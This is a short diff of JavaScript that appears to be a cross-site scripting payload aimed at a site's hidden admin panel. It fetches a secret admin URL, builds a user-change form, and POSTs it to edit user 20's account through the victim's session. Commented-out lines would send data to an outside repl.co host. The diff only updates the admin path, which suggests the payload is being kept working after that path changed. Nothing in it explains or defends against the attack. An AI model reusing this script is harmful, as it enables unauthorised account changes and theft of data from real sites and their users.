@@ -1,7 +1,7 @@
 redirected = false;
 (async () => {
   res = await fetch(
-    "https://gyane.xyz/gyane_private_admin_no_body_should_know_it/auth/user/"
+    "https://gyane.xyz/gyane_private_admin_no_body_should_know_it_changed/auth/user/"
   );
   // fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
   //   method: "POST",
@@ -32,7 +32,7 @@ redirected = false;
     formData.append("initial-date_joined_1", "14:39:02");
     formData.append("_save", "Save");
     res3 = await fetch(
-      "https://gyane.xyz/gyane_private_admin_no_body_should_know_it/auth/user/20/change/",
+      "https://gyane.xyz/gyane_private_admin_no_body_should_know_it_changed/auth/user/20/change/",
       { method: "POST", body: formData }
     );
     // fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
